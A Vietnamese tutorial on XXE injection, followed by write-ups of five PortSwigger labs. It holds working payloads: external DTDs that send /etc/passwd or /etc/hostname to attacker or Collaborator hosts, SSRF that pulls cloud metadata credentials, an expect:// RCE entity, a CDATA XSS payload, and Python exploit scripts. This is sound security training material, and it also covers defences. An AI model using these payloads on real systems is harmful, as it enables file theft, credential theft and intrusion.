\# XML external entity (XXE) injection

![image](https://hackmd.io/_uploads/r1upa8y2p.png)

## Khái niệm & Khai thác & Phòng tránh

### Khái niệm

#### XML

- là ngôn ngữ đánh dấu mở rộng, gần tương tự với HTML, chỉ khác là HTML dùng để trình bày giao diện ra trang web, còn XML sử dụng để transfer data.

| Tiêu chí   | XML                                                                   | HTML                                                         |
| ---------- | --------------------------------------------------------------------- | ------------------------------------------------------------ |
| Mục đích   | XML thường được sử dụng để lưu trữ và vận chuyển dữ liệu (carry data) | HTML thường được sử dụng để trình bày dữ liệu (display data) |
| Định hướng | Định hướng theo nội dung                                              | Định hướng theo định dạng                                    |
| Thẻ        | Không được xác định trước, có thể mở rộng                             | Được xác định trước (predefined), tính mở rộng hạn chế       |

- Vậy XML được dịch nôm ra là ngôn ngữ đánh dấu mở rộng, được thiết kế với mục đích lưu trữ, truyền dữ liệu và cả người và "máy" đều có thể đọc được.

![image](https://hackmd.io/_uploads/B1Q1uVk2T.png)

![image](https://hackmd.io/_uploads/B1Z7jLJh6.png)

Cấu trúc của file bao gồm

- `<?xml version="1.0"?>` : Ở đây là meta để khai báo XML
- `<Person></Person>` : Root node
- `<Name></Name> và <Age></Age>` : Children node

![image](https://hackmd.io/_uploads/HyBx_VJ2T.png)

Khi chúng ta upload 1 file xml thì nó sẽ đi qua XML parser đây là cách xử lý XML và giúp lập trình viên xử lý data XML đơn giản hơn

![image](https://hackmd.io/_uploads/HyCLOV136.png)

Tác dụng của XML parser

![image](https://hackmd.io/_uploads/SJ4lK4yn6.png)

- Thẻ comment: <! – / -> – Dãy ký tự này được hiểu là phần đầu / phần cuối của một comment. Vì vậy, bằng cách đưa một trong số chúng vào tham số Tên người dùng:

```xml!
Username = foo<!--
```

- Ký hiệu và: & – Dấu và được sử dụng trong cú pháp XML để đại diện cho các thực thể. Định dạng của một thực thể là & ký hiệu ;. Một thực thể được ánh xạ tới một ký tự trong bộ ký tự Unicode.

```xml!
<tagnode>&lt;</tagnode>
```

các ký tự đặc biệt trong xml sẽ phải encode

![image](https://hackmd.io/_uploads/S1ra3VJhT.png)

- Lưu ý là nội dung của các ENTITY không nên có những kí tự đặc biệt như là `< > " '&` bởi vì nó sẽ làm phá vỡ đi cấu trúc của một file XML. Để có thể sử dụng những từ đó, chúng ta cần phải sử dụng những built-in entity chẳng hạn như là dấu `<` thì mình sử dụng &lt;

![image](https://hackmd.io/_uploads/Hy8oiUy3a.png)

XML khi sai cú pháp vs cú pháp đúng

![image](https://hackmd.io/_uploads/S1pb2E136.png)

#### Document Type Definition(DTD)

- DTD (document type definitions) - dịch nôm ra DTD dùng để "định nghĩa loại tài liệu" thông qua việc xác định cấu trúc cũng như chỉ ra format hợp lệ của các elements và attributes trong file xml.
- DTD (document type definition) là thẻ đặc biệt giúp chúng ta có thể include như trong PHP. Nó giống như cho phép chúng ta định nghĩa 1 biến, tài nguyên mới để chúng ta sử dụng, và trong đó chúng ta có thể định nghĩa 1 tài nguyên là EXTERNAL ENTITY giúp chúng ta có thể đọc 1 file hay 1 url
- XML DTD chứa các khai báo (declaraion) nhằm dựng nên cấu trúc của một file XML, loại dữ liệu hoặc là các item khác. DTD được khai báo với DOCTYPE elemt ở đầu file XML. DTD có thể tự định nghĩa ở trong chính file XML (Internal DTD) hoặc có thể được load ở ngoài (External DTD)
- ví dụ dưới đây là ví dụ về một External DTD. Tức là bản thân DTD là một file, nằm ngoài file xml

![image](https://hackmd.io/_uploads/SJy9Xq1hp.png)

- DOCTYPE declaration. Phần này chứa một reference tới một DTD file có tên Note.dtd. Nội dung của nó:

![image](https://hackmd.io/_uploads/BkMy6Iyna.png)

- Nội dung file Note.dtd chỉ ra một số ràng buộc nhất định với file .xml. Ví dụ như mỗi note element phải bao gồm những elements khác bên trong nó: to,from,heading,body hay xác định các elements nào phải thuộc loại nào

![image](https://hackmd.io/_uploads/Hkbc9Vknp.png)

![image](https://hackmd.io/_uploads/rJ_dcNk36.png)

- khi đó giá trị của address trong thẻ name sẽ được lấy trong file "address.dtd"

Vậy DTD giúp các file xml thống nhất một standard/format xác định, từ đó dễ dàng hơn trong việc xác định cấu trúc của dữ liệu, đặc biệt khi chuyển file từ nơi này sang nơi khác, người sử dụng có thể sử dụng DTD để verify lại file xml có giống như standard/format mong muốn hay không.

Có 2 dạng DTD thường được sử dụng:

- **Internal** DTD được khai báo trong chính file XML tương ứng:

```xml!
<!DOCTYPE root-element [element-declarations]>
```

VD:

```xml!
<?xml version="1.0"?>
// Khai báo internal DTD
<!DOCTYPE note [
    <!ELEMENT note (to,from,heading,body)>
    <!ELEMENT to (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT heading (#PCDATA)>
    <!ELEMENT body (#PCDATA)>
]>
<note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget</body>
</note>
```

- **External DTD**: Khai báo nội dung trong một tệp tin .dtd sẽ được tham chiếu tới sau đó. Ví dụ, kẻ tấn công host một trang web public có chứa một external DTD file có URL `http://attacker.com/malicious.dtd` có nội dung như sau:

```xml!
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Tệp tin DTD này thực hiện các bước hoạt động như sau:

- Định nghĩa một parameter entity với tên `file` có giá trị là nội dung tệp `/etc/passwd`
- Định nghĩa một entity với tên `eval`, trong entity này chứa một định nghĩa parameter entity khác với tên `exfiltrate` sẽ gửi request tới website của attacker `http://attacker.com/`, truyền tham số x chứa nội dung tệp `/etc/passwd` bằng cách gọi tham chiếu entity `%file`;
- Gọi tham chiếu entity `%eval` chứa định nghĩa entity `exfiltrate`
- Gọi tham chiếu entity `%exfiltrate;`.
- `&#x25;` là định dạng HTML encode của ký tự % do được chứa trong một định nghĩa parameter entity khác.
- Các định nghĩa parameter entity cần được gọi tham chiếu mới có thể hoạt động. Như trong ví dụ file DTD trên gọi tham chiếu `%eval;`, để định nghĩa về entity eval hoạt động thì cần gọi thêm tham chiếu `%exfiltrate;`, trong định nghĩa của entity exfiltrate đã chứa việc gọi tham chiếu `%file;`

Ví dụ tệp DTD này được deploy tại URL public: `http://attacker.com/malicious.dtd`

Cuối cùng, kẻ tấn công định nghĩa một parameter entity, gửi payload tới server chứa lỗ hổng Blind XXE

```xml!
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://attacker.com/malicious.dtd"> %xxe;]>
```

- Server truy cập tới file DTD được chỉ định trong server attacker và thực hiện các bước được khai báo. Từ đó server attacker nhận được nội dung tệp tin mong muốn.

Ngoài DTD ra, thì file xml còn có thể được "definition" bởi một kiểu khác là XML Schema Definition (XSD) - định nghĩa theo lược đồ. Nhưng chỉ có DTD gây ra lỗi XXE Injection.

#### Entity

- **Entity**: là một khái niệm có thể được sử dụng như một kiểu tham chiếu đến dữ liệu, cho phép thay thế một ký tự đặc biệt, một khối văn bản hay thậm chí toàn bộ nội dung một file vào trong tài liệu xml. Một số kiểu entity: character, parameter, named (internal), external…
- Có thể coi các entity là một biến để lưu trữ dữ liệu vậy, chúng ta có thể khai báo nó một lần, gán giá trị vào cho nó và sử dụng ở trên toàn bộ file XML. Các entity chỉ có thể được khai báo ở DTD (Document Type Definition)
- Entity có thể được khai báo như sau:

```xml!

<!ENTITY entity-name “entity-value” >

Hoặc:

<!ENTITY entity-name SYSTEM "URI/URL">
```

Chúng ta có thể hiểu đơn giản DTD Entity giống như những biến trong lập trình vậy.

DTD Entity cũng có internal và external !

- ví dụ về Internal DTD Entity:

```xml!
Syntax:
<!ENTITY entity-name "entity-value">

Example:
<!ENTITY website "cuong.com">
<!ENTITY author "123 &website;">
<author>&author;</author>

Output:
<author>123 cuong.com</author>
```

- Ví dụ về External DTD Entity:

```xml!
Syntax:
<!ENTITY name SYSTEM "URI/URL">

Example:
<!ENTITY author SYSTEM "http://example.com/entities.dtd"> <author>&author;</author>
```

#### XML Custom Entity

- XML cho phép chúng ta tự tạo nên một custom entity được khai báo ở trong DTD

![image](https://hackmd.io/_uploads/SJvncK1nT.png)

- Ở đây chúng ta đã khai báo một entity tên gọi myentity với giá trị là "my entity value", vì vậy ở những node thì nếu chúng ta chèn entity myentity thì sẽ cần ghi ra là ==&myenity==;

#### XML External Entity

- External Entity là một loại custom entity mà giá trị của nó load ở bên ngoài DTD. Ở đây nó sẽ ảnh hưởng đến bảo mật của trang web bởi vì giá trị của một external entity có thể là đường dẫn của một file hoặc URL.
- **External entity**: entity tham chiếu đến nội dung một file bên ngoài tài liệu xml
- Ví dụ external entity:

```xml!
<!DOCTYPE order SYSTEM "order.dtd">
<!DOCTYPE ran SYSTEM "/dev/random">
<!DOCTYPE request [
     <!ENTITY include SYSTEM "c:\secret.txt">
]>
```

#### Lỗ hổng (XXE) injection

![image](https://hackmd.io/_uploads/SJtFot1ha.png)

- XXE (XML External Entity) là một loại tấn công tấn công mà hacker sử dụng các external entity trong tài liệu XML để tạo ra các cuộc tấn công tới hệ thống hoặc để truy cập vào dữ liệu bảo mật. XXE có thể sử dụng để thực hiện các cuộc tấn công với mục đích khác nhau như abitrary file read(LFI), SSRF.

![image](https://hackmd.io/_uploads/SJ296Ky3T.png)

- XXE Injection là lỗi hacker tận dụng các Entity, External Entity để buộc các XML parser (trình đọc cú pháp XML, mà ở đây là ứng dụng bị tấn công ấy) phải xử lý các tác vụ nguy hiểm như đọc file, gán biến… để trả về kết quả cho kẻ tấn công
- Bản chất của lỗ hổng này là xử lý XML Untrusted Data và tính năng xử lý DTD trong thư viện XML Parser được bật

![image](https://hackmd.io/_uploads/Bkif1Hy3a.png)

![image](https://hackmd.io/_uploads/S1f_Wryha.png)

- với XEE injection có các kiểu tấn công

![image](https://hackmd.io/_uploads/SyTJeSJ3p.png)

![image](https://hackmd.io/_uploads/H1dnlrk3p.png)

![image](https://hackmd.io/_uploads/S1GsnB1h6.png)

- với XEE expansion có các kiểu tấn công

![image](https://hackmd.io/_uploads/SJWzMSJ2T.png)

- Gọi entity lol9 với cú pháp &lol9, trông có vẻ vô hại, nhưng từ lol9 đến lol đã là 10^10 lần từ "lol" được gọi đến lần lượt thông qua các entity, tương đương 1.000.000.000 chữ "lol" cần được parser xml xử lý. Điều này khiến over load parser và dẫn đến DoS.

![image](https://hackmd.io/_uploads/BJhDfH1na.png)

- đây mới chỉ là Internal entity

XML có thể xuất hiện trong các file office và chúng ta có thể chèn XML và các file này

![image](https://hackmd.io/_uploads/rkhmmSy36.png)

#### Dấu hiệu

![image](https://hackmd.io/_uploads/BybprS1hT.png)

![image](https://hackmd.io/_uploads/S1SDUr13p.png)

- định dạng data trong API thường dùng 2 loại chính là JSON (JavaScript Object Notation) và XML (Extensible Markup Language) - Ngày nay, JSON được sử dụng nhiều trong Restful API. Nó được xây dựng từ Javascript, ngôn ngữ mà được dùng nhiều, tương thích với cả front-end và back-end của cả web app và web service. JSON là 1 định dạng đơn giản với 2 thành phần: key và value
  – Key thể hiện thuộc tính của Object
  – Value thể hiện giá trị của từng Key
  VD:

```javascript!
{
  "streetAddress": "21 2nd Street",
  "city": "New York",
  "state": "NY",
  "postalCode": "10021"
}
```

- Trong JSON dùng `{ }` và `[ ]` để dánh dấu dữ liệu. XML thì tương tự như HMTL, dùng thẻ để đánh dấu và được gọi là nodes.  
  VD:

![image](https://hackmd.io/_uploads/Hkzq_Bkh6.png)

![image](https://hackmd.io/_uploads/ry2hur12a.png)

- Một số thư viện , ứng dụng API cho phép dùng cả JSON và XML
- Một số Request có POST Data là JSON, có thể thử chuyển sang XML để test

![image](https://hackmd.io/_uploads/H1w4Drkn6.png)

![image](https://hackmd.io/_uploads/HycjFLk26.png)

### Khai thác

#### File Disclosure (trích xuất file)

- Kiểu tấn công này thường xảy ra khi trang web khai báo và định nghĩa các external entities chứa nội dung các file và chúng được hiển thị trong giao diện hay response tới người dùng.

```xml!
Syntax:
<!ENTITY name SYSTEM "URI/URL">
```

Tại đây, nếu hacker khai báo một URI (hay với XML thì được gọi là system identifier) và parser được cấu hình để xử lý các external entities thì có thể dẫn tới những vấn đề rất lớn.

Request:

![image](https://hackmd.io/_uploads/r15Uw5Jna.png)

Response:

![image](https://hackmd.io/_uploads/rJ7DPqJ3a.png)

#### SSRF

Request:

![image](https://hackmd.io/_uploads/B1O2vckn6.png)

Response:

![image](https://hackmd.io/_uploads/B1YaDc126.png)

#### Access Control Bypass (Loading Restricted Resources — ví dụ với PHP)

![image](https://hackmd.io/_uploads/rkoJd9y2T.png)

#### XSS

Dấu phân cách phần CDATA: `<! \ [CDATA \ [/]]>` – Các phần CDATA được sử dụngđể thoát khỏi các khối văn bản có chứa các ký tự mà nếu không sẽ được nhận dạng là đánh dấu. Nói cách khác, các ký tự nằm trong phần CDATA không được phân tích cú pháp bởi trình phân tích cú pháp XML.

Ví dụ: nếu cần biểu diễn chuỗi `<foo>` bên trong nút văn bản, phần CDATA có thể được sử dụng:

```xml!
<node>
    <![CDATA[<foo>]]>
</node>
```

để `<foo>` sẽ không được phân tích cú pháp dưới dạng đánh dấu và sẽ được coi là dữ liệu ký tự.

Nếu một nút được tạo theo cách sau:

```xml!
<username><![CDATA[<$userName]]></username>
```

- Một thử nghiệm khác liên quan đến thẻ CDATA. Giả sử rằng tài liệu XML được xử lý để tạo ra một trang HTML. Trong trường hợp này, các dấu phân cách phần CDATA có thể bị loại bỏ một cách đơn giản mà không cần kiểm tra thêm nội dung của chúng. Sau đó, có thể chèn các thẻ HTML, thẻ này sẽ được đưa vào trang đã tạo, bỏ qua hoàn toàn các quy trình vệ sinh hiện có.
- Hãy xem xét một ví dụ cụ thể. Giả sử chúng ta có một nút chứa một số văn bản sẽ được hiển thị lại cho người dùng.

```xml!
<html>
    $HTMLCode
</html>
```

Sau đó, kẻ tấn công có thể cung cấp thông tin đầu vào sau:

```xml!
$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
```

và lấy nút sau:

```xml!
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```

Trong quá trình xử lý, các dấu phân cách phần CDATA bị loại bỏ, tạo ra mã HTML sau:

```javascript!
<script>
    alert('XSS')
</script>
```

Kết quả là ứng dụng dễ bị tấn công bởi XSS.

#### Công cụ kiểm tra XML injection

- https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt

#### RCE

```xml!
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
  <user>`&xxe;`</user>
  <pass>`mypass`</pass>
</creds>
```

#### Xinclude

- Một số trang web không trực tiếp nhận dữ liệu XML từ người dùng, mà nhúng các dữ liệu người dùng vào document XML. Điều này khiến kẻ tấn công không thể chỉnh sửa payload XML theo mong muốn.

- Ví dụ khi dữ liệu do người dùng gửi được hệ thống kết hợp vào một SOAP backend request, sau đó được xử lý bởi SOAP backend. Nên chúng ta không thể thực hiện tấn công XXE theo các hình thức được đề cập phía trên do không thể kiểm soát nội dung toàn bộ document XML, dẫn đên không thể tự định nghĩa hoặc làm thay đổi tính năng DOCTYPE. XInclude là một giải pháp tốt để thay thế các phương pháp tấn công phía trên, do XInclude là một phần của đặc tả XML cho phép tạo một document XML từ các sub-documents.

### Phòng tránh

- Tắt DTD

trong PHP:

![image](https://hackmd.io/_uploads/H1u-_Uk2p.png)

![image](https://hackmd.io/_uploads/r1oud513p.png)

Trong ngôn ngữ JAVA:

```java!
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);

.setFeature("http://xml.org/sax/features/external-general-entities",false)

.setFeature("http://xml.org/sax/features/external-parameter-entities",false);
```

etree thuộc thư viện lxml trong Python:

```python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

- Lỗi XXE ở các ngôn ngữ và thư viện khác nhau xảy ra là do các chức năng hỗ trợ XML có các thành phần gây ra lỗi bảo mật đó như là support external entity. Các dễ nhất và hiệu quả nhất là tắt các chức năng đó đi.
- Cùng với đó là nhớ tắt luôn chức năng Xinclude.
- Luôn nhớ đọc document về các thư viện XML bạn đang sử dụng để biết cách tắt những chắc năng không cần thiết.
- Thêm filter cho các ký tự &, % . Ví dụ đoạn code sau ngăn chặn dữ liệu XML chứa các ký tự & và % bằng hàm strpos()

```xml!
// filter character & and %
if (strpos($xmlfile, '&') || strpos($xmlfile, '%')) {
	$result = sprintf("<result><msg>Invalid character found!</msg></result>");
        // block ...
}
```

## 1. Lab: Exploiting XXE using external entities to retrieve files

link: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

### Đề bài

![image](https://hackmd.io/_uploads/B1bGB4x2a.png)

### Phân tích

- Trang web chứa chức năng Check stock, trong đó quá trình phân tích dữ liệu XML không chứa cơ chế ngăn chặn lỗ hổng XXE injection có thể dẫn đến trả về các dữ liệu không mong muốn trong response. Để hoàn thành bài lab, chúng ta cần khai thác lỗ hổng XXE injection từ đó truy xuất nội dung file /etc/passwd.
- mình sử dụng chức năng Check stock và quan sát request trong Burp Suite:

![image](https://hackmd.io/_uploads/S138L4xha.png)

![image](https://hackmd.io/_uploads/H1S_IEx26.png)

Trang web sử dụng ngôn ngữ XML gửi yêu cầu check stock với các thẻ `<productId>` và `<storeId>`. Hệ thống thực hiện phân tích dữ liệu XML và trả về kết quả số lượng sản phẩm còn lại trong response.

- Chúng ta có thể tự định nghĩa một entity với giá trị bất kỳ: mình dùng payload

```xml!
<!DOCTYPE cuong [<!ENTITY xxe "/etc/passwd">]>
```

![image](https://hackmd.io/_uploads/HkbuDEx3a.png)

server không có cơ chế validate XML này. Do đó, mình có thể định nghĩa một external entity &xxe; mà giá trị của nó là nội dung file /etc/passwd và sử dụng entity `&xxe;` tại trường productId.

### Khai thác

- khi biết XML parser xử lý và cho phép mình định nghĩa 1 internal entity trong DTD vậy mình thử nó với external entity

```xml!
<!DOCTYPE cuong [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

![image](https://hackmd.io/_uploads/HkSvo4l36.png)

- và mình đã đọc được file /etc/passwd thông qua entity `&xxe;`

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a2300090407a56c838246ca009900ac.web-security-academy.net'

session=requests.Session()

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE cuong [ <!ENTITY xxe SYSTEM  "file:///etc/passwd"> ]><stockCheck><productId>&xxe;#1</productId><storeId>1</storeId></stockCheck>'

response= session.post(
    url + '/product/stock',
    data=data,
    verify=False,
)

print(response.text)
```

![image](https://hackmd.io/_uploads/ry4zjNg3T.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/HJUEiVx3a.png)

## 2. Lab: Exploiting XXE to perform SSRF attacks

link: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

### Đề bài

![image](https://hackmd.io/_uploads/Hyv9aEl3T.png)

### Phân tích

- Chức năng "Check stock" của trang web phân tích cú pháp XML và trả về kết quả yêu cầu người dùng trong giao diện. Biết rằng hệ thống chứa một EC2 metadata endpoint (giả lập) trong URL cố định là http://169.254.169.254/. Có thể khai thác endpoint này nhằm truy xuất các thông tin dữ liệu nhạy cảm của instance. Để giải quyết bài lab, khai thác lỗ hổng XXE kết hợp phương pháp tấn công SSRF nhằm truy xuất giá trị access key từ EC2 metadata endpoint này.
- Một mục tiêu điển hình thường được nhắm tới đối với các server được cung cấp bởi AWS là các dữ liệu instance metadata.
- Về cơ bản chúng ta có thể hiểu instance meta-data là các dữ liệu về instance với mục đích sử dụng cho việc cài đặt, cấu hình và quản lý các instance đang chạy (running), chúng thường được chia làm các trường như host name, events, security groups, ... Các dữ liệu instance meta-data luôn cần được bảo mật do liên quan mật thiết tới các thông tin nhạy cảm của server đang sở hữu.

chúng ta có thể truy cập các dữ liệu instance meta-data bằng các URI IPv4 và IPv6 cụ thể:

- IPv4: `http://169.254.169.254/latest/meta-data/`
- IPv6: `http://[fd00:ec2::254]/latest/meta-data/`

tương tự bài trên mình định nghĩa 1 entity

![image](https://hackmd.io/_uploads/BJ78ySxnT.png)

và nó được XML parser thực hiện đọc nội dung file /etc/passwd thành công cho thấy chúng ta có thể kết hợp phương pháp tân công SSRF nhằm khai thác các dữ liệu instance meta-data từ default URL `http://169.254.169.254/`

### Khai thác

- mình khai thác các dữ liệu instance meta-data từ default URL http://169.254.169.254/ với payload

```xml!
<!DOCTYPE cuong [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
```

![image](https://hackmd.io/_uploads/rkVblHl36.png)

Liệt kê danh sách file trong folder latest:

![image](https://hackmd.io/_uploads/HyFflHeha.png)

và tương tự như vậy mình liệt kê được data trong folder admin

![image](https://hackmd.io/_uploads/rJ8BeHg36.png)

- mình Thu được `SecretAccessKey=a5EHw4Hn9UYoUQS7MxcjHwDGb1vMHEi3bSo8CZv4`, bài lab hoàn thành:

![image](https://hackmd.io/_uploads/HJ4AgBx3a.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a49003a03e275c7874b092c00c900cc.web-security-academy.net'

session=requests.Session()

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;#1</productId><storeId>1</storeId></stockCheck>'


response= session.post(
    url + '/product/stock',
    data=data,
    verify=False,
)

print(response.text)
```

![image](https://hackmd.io/_uploads/H1qX-Hxha.png)

## 3. Lab: Blind XXE with out-of-band interaction

link: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

### Đề bài

![image](https://hackmd.io/_uploads/B1fJNBlhT.png)

### Phân tích

- Chức năng "Check stock" của trang web phân tích cú pháp dữ liệu XML nhưng không trả về bất kỳ kết quả nào trong giao diện. Để hoàn thành bài lab, chúng ta cần thực hiện một kịch bản DNS lookup tới client Burp Collaborator.
- Định nghĩa một entity với nội dung bất kỳ, nhận thấy giao diện không trả về giá trị entity:

![image](https://hackmd.io/_uploads/rknLErxhT.png)

Dự đoán trang web thực hiện phân tích cú pháp dữ liệu XML, chúng ta có thể dễ dàng kiểm tra điều này

![image](https://hackmd.io/_uploads/Hk50VBg26.png)

### Khai thác

- Thực hiện một kịch bản DNS lookup tới client Burp Collaborator:
- Tuy trang web trả về thông báo "Invalid product ID" nhưng trước đó đã thực hiện quá trình phân tích cú pháp XML, dẫn đến client Burp Collaborator nhận được request DNS lookup gửi từ server victim:
  mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a67005003e2427580bc21a300c10028.web-security-academy.net'

session=requests.Session()

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://yikfn9un5au63ryrq5f0jfe1lsrjf93y.oastify.com"> ]><stockCheck><productId>&xxe;#1</productId><storeId>1</storeId></stockCheck>'


response= session.post(
    url + '/product/stock',
    data=data,
    verify=False,
)

print(response.text)
```

![image](https://hackmd.io/_uploads/B1yTQrg3a.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/HJgdErxnp.png)

## 4. Lab: Blind XXE with out-of-band interaction via XML parameter entities

link: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

### Đề bài

![image](https://hackmd.io/_uploads/ryUkIrln6.png)

### Phân tích

- Chức năng "Check stock" của trang web phân tích cú pháp dữ liệu XML nhưng không trả về bất kỳ kết quả nào trong giao diện. Đồng thời chứa một cơ chế ngăn chặn tấn công XXE. Để hoàn thành bài lab, chúng ta vượt qua lớp ngăn chặn, từ đó thực hiện một kịch bản DNS lookup tới client Burp Collaborator.
- Bài này nâng cấp từ bài trên khi server trang bị thêm cơ chế block các requests có chứa các external entities thông thường.

![image](https://hackmd.io/_uploads/Hka98HlnT.png)

- Tức là chúng ta không thể định nghĩa các entity thông thường với ký tự & như &xxe;. Tuy nhiên, ký tự % được phép sử dụng, giao diện chỉ trả về thông báo cú pháp XML lỗi chứ không phải do nguyên nhân phát hiện ký tự nhạy cảm:

![image](https://hackmd.io/_uploads/H1JkDBx2a.png)

### Khai thác

- Để bypass, ta sẽ sử dụng XML parameter entity. Đây là một dạng entity đặc biệt của XML sử dụng kí tự `%` thay `&`. Đồng thời những parameter entity chỉ được sử dụng trong DTD nó được định nghĩa. Ta sẽ sử dụng payload sau:

```xml!
<!DOCTYPE cuong [ <!ENTITY % xxe SYSTEM "http://<COLLABORATOR_DOMAIN>"> %xxe; ]>
```

Sau khi gửi request, client Collaborator nhận được yêu cầu phân giải tên miền từ server victim, bài lab hoàn thành:

![image](https://hackmd.io/_uploads/HJ-SuSgh6.png)

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a57000904bad72680d63a1a005400c9.web-security-academy.net'

session=requests.Session()

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://yikfn9un5au63ryrq5f0jfe1lsrjf93y.oastify.com"> %xxe; ]><stockCheck><productId>#1</productId><storeId>1</storeId></stockCheck>'


response= session.post(
    url + '/product/stock',
    data=data,
    verify=False,
)

print(response.text)
```

![image](https://hackmd.io/_uploads/SJyfdHgha.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/SyTaPHg36.png)

## 5. Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

link: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration

### Đề bài

![image](https://hackmd.io/_uploads/H1VXTHgnT.png)

### Phân tích

- Chức năng "Check stock" của trang web phân tích cú pháp dữ liệu XML nhưng không trả về bất kỳ kết quả nào trong giao diện. Để hoàn thành bài lab, chúng ta cần truy xuất dữ liệu tệp /etc/hostname và submit giá trị hostname. Lưu ý rằng với các external DTD chỉ có thể deploy trên exploit server được cung cấp bởi bài lab và Burp Collaborator server.

- Ký tự `&` không được phép sử dụng nên chúng ta không thể định nghĩa các entities thông thường:

![image](https://hackmd.io/_uploads/B1gv0rgnT.png)

Có thể sử dụng parameter entity thay thế, payload kiểm tra DNS lookup với Burp Collaborator Client:

```xml!
<!DOCTYPE abc [ <!ENTITY % xxe SYSTEM "http://b6iu3bxnzgli3bu11nxef0ehe8k08p.oastify.com"> %xxe; ]>
```

![image](https://hackmd.io/_uploads/rJknRrenT.png)

đợi 1 lúc chúng ta mới thấy response trả về
chứng tỏ web server đã truy cập vào đường link của chúng ta

- Dự đoán trang web chứa lỗ hổng Blind XXE injection tại chức năng Stock check

### Khai thác

- Chúng ta sẽ xây dựng một file DTD thực hiện các bước truy xuất nội dung tệp tin /etc/hostname hiển thị tại exploit server được cung cấp.
- Định nghĩa một parameter entity với tên file có giá trị là nội dung tệp tin `/etc/hostname`

```xml!
<!DOCTYPE % file SYSTEM "file:///etc/hostname">
```

Định nghĩa một entity với tên exploit chứa một định nghĩa khác parameter entity với tên retrieve truy cập tới Burp Collaborator và gửi tham số data với tham chiếu `%file;`

```xml!
<!ENTITY % exploit "<!ENTITY % retrieve SYSTEM 'http://acqt9a3m5frh9a007m3dlzkgk7q0ep.oastify.com/?data=%file;'>">
```

Gọi các tham chiếu `%exploit;, %retrieve;`, cuối cùng chúng ta có nội dung file external DTD đầy đủ:

```xml!
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % exploit "<!ENTITY % retrieve SYSTEM 'https://acqt9a3m5frh9a007m3dlzkgk7q0ep.oastify.com/?data=%file;'>">
%exploit;
%retrieve;
```

Nội dung tệp DTD này được lưu tại `/exploit.dtd`

![image](https://hackmd.io/_uploads/r1xpJLxhp.png)

store và view exploit chúng ta được

![image](https://hackmd.io/_uploads/BJ_XxIeha.png)

Và hiện giờ chúng ta chỉ cần khiến server victim gọi tới tệp DTD này. Định nghĩa một parameter entity như sau:

```xml!
<!DOCTYPE cuong [<!ENTITY % xxe SYSTEM
"https://exploit-0a0d004e04baf0618069e3c401cf0022.exploit-server.net/exploit.dtd"> %xxe;]>
```

![image](https://hackmd.io/_uploads/SJL5xIe3p.png)

Sau khi gửi request, server truy cập tới external DTD file do chúng ta tạo và thực hiện các bước theo yêu cầu. Kiểm tra log và mình nhận được chuỗi data và giải quyết được lab này

- với cách khác chúng ta có thể xem được data trên webserver và bài lab cúng cấp

- Trang web cho ta server exploit để tiến hành khai thác out of band, ta sẽ tạo một trang exploit chứa một file a.dtd nhằm lấy nội dung của file /etc/hostname như sau:

![image](https://hackmd.io/_uploads/BJyEudxna.png)

```xml!
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0a540014042f10ef83f1325901360077.exploit-server.net/exploit?x=%file;'>">
%eval;
%exfiltrate;
```

